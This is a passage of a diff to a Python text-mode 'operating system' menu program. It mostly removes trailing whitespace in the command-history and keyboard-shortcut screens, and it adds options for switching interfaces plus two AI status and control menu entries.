@@ -27388,9 +29517,9 @@ def feature_command_history_search():
                     print(f"\n{COLORS['2'][0]}✅ Exported to: {export_file}{RESET}")
                 except Exception as e:
                     print(f"\n{COLORS['1'][0]}❌ Export failed: {e}{RESET}")
-                
+
                 input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-        
+
         elif choice == '7':
             # Clear history (dangerous)
             confirm = input(f"\n{COLORS['1'][0]}⚠️  WARNING: This will delete ALL command history!{RESET}\n{BOLD}Type 'DELETE' to confirm: {RESET}").strip()
@@ -27403,30 +29532,30 @@ def feature_command_history_search():
 def feature_keyboard_shortcuts_cheatsheet():
     """Display comprehensive keyboard shortcuts cheat sheet."""
     global KEYBOARD_SHORTCUTS
-    
+
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header("⌨️ Keyboard Shortcuts Cheat Sheet")
-        
+
         if KEYBOARD_SHORTCUTS is None:
             print(f"{COLORS['1'][0]}Keyboard shortcuts registry not initialized.{RESET}")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
             break
-        
+
         shortcuts = KEYBOARD_SHORTCUTS.get_shortcuts()
         categories = list(shortcuts.keys())
-        
+
         print(f"\n{BOLD}Available Categories:{RESET}")
         for i, cat in enumerate(categories, 1):
             count = len(shortcuts[cat])
             print(f"  [{i}] {cat.upper()} ({count} shortcuts)")
-        
+
         print(f"  [A] Show All")
         print(f"  [S] Search Shortcuts")
         print(f"  [0] Return")
-        
+
         choice = input(f"\n{BOLD}Select category or option: {RESET}").strip().upper()
-        
+
         if choice == '0':
             break
         elif choice == 'A':
@@ -27435,12 +29564,12 @@ def feature_keyboard_shortcuts_cheatsheet():
             print_header("⌨️ All Keyboard Shortcuts")
             print(KEYBOARD_SHORTCUTS.get_all_shortcuts_formatted())
             input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-        
+
         elif choice == 'S':
             # Search shortcuts
             search_term = input(f"{BOLD}🔍 Search for shortcut: {RESET}").strip().lower()
             found = False
-            
+
             for category, shortcut_list in shortcuts.items():
                 for shortcut in shortcut_list:
                     if search_term in shortcut["key"].lower() or \
@@ -27449,31 +29578,31 @@ def feature_keyboard_shortcuts_cheatsheet():
                         if not found:
                             print(f"\n{COLORS['2'][0]}Found shortcuts:{RESET}\n")
                             found = True
-                        
+
                         key = shortcut["key"].ljust(15)
                         action = shortcut["action"].ljust(20)
                         print(f"  [{category:15}] {key} → {action} : {shortcut['description']}")
-            
+
             if not found:
                 print(f"\n{COLORS['4'][0]}No matching shortcuts found.{RESET}")
-            
+
             input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-        
+
         elif choice.isdigit() and 1 <= int(choice) <= len(categories):
             # Show specific category
             category = categories[int(choice) - 1]
             shortcut_list = shortcuts[category]
-            
+
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header(f"⌨️ {category.upper()} Shortcuts")
-            
+
             print(f"\n{BOLD}Available Shortcuts:{RESET}\n")
             for i, shortcut in enumerate(shortcut_list, 1):
                 key = shortcut["key"].ljust(15)
                 action = shortcut["action"].ljust(20)
                 desc = shortcut["description"]
                 print(f"  {i:2d}. {key} → {action} : {desc}")
-            
+
             input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
 
 # --- MAIN OPERATING SYSTEM LOOP ---
@@ -27482,7 +29611,7 @@ def run_classic_command_center():
     global stop_clock, mini_view, truncated_thermal, is_blinking, temp_unit, active_color_key, user_has_chosen, display_mode
 
     _bootstrap_classic_stack()
-    
+
     # Initialize plugin system with centralized pythonOS_data location
     if PluginManager:
         try:
@@ -27619,14 +29748,28 @@ def run_classic_command_center():
 
         choice = input(f"{BOLD}🎯 Select an option (0-Z, 14): {RESET}").strip().upper()
         _update_user_config(last_choice=choice)
-        
+
         # Record command to history (skip settings/navigation commands)
         if COMMAND_HISTORY and choice not in ('1', '2', '3', '4', '5', '6', 'V', 'U'):
             COMMAND_HISTORY.add_command(choice, category="command_center")
-        
+
         stop_clock = True
 
-        if choice == '1':
+        # === INTERFACE SELECTION (NEW) ===
+        if choice == '1C':
+            # Stay in classic
+            continue
+        elif choice == '2P':
+            # Switch to PyTextOS
+            _set_display_mode("pytextos")
+            return run_pytextos(return_to_classic=True)
+        elif choice == '3D':
+            # Switch to Unified Dashboard
+            _set_display_mode("unified")
+            return run_unified_dashboard(return_to_classic=True)
+
+        # === ORIGINAL SETTINGS & OPTIONS ===
+        elif choice == '1':
             is_blinking = not is_blinking
             _update_user_config(is_blinking=is_blinking)
         elif choice == '2':
@@ -27688,6 +29831,8 @@ def run_classic_command_center():
         elif choice == 'S': safe_run("general", "Graphing_Calculator", feature_graphing_calculator)
         elif choice == 'T': safe_run("general", "Text_Doc_Center", feature_text_doc_center)
         elif choice == 'X': safe_run("general", "TUI_Tools", feature_tui_tools)
+        elif choice == '(': safe_run("ai", "AI_Tactical_Status", feature_ai_tactical_status)
+        elif choice == ')': safe_run("ai", "AI_Tactical_Control", feature_ai_tactical_control_panel)
         elif choice == 'V':
             _set_display_mode("classic")
             break
@@ -27939,7 +30084,7 @@ def _bootstrap_classic_stack():
     if _classic_bootstrap_done:
         return
     _classic_bootstrap_done = True
-    
+
     # Initialize command history and keyboard shortcuts
     try:
         if COMMAND_HISTORY is None:
@@ -27948,7 +30093,7 @@ def _bootstrap_classic_stack():
             KEYBOARD_SHORTCUTS = KeyboardShortcutsRegistry()
     except Exception as e:
         print(f"Warning: Failed to initialize command history/shortcuts: {e}")
-    
+
     try:
         start_autonomous_monitor()
     except Exception:
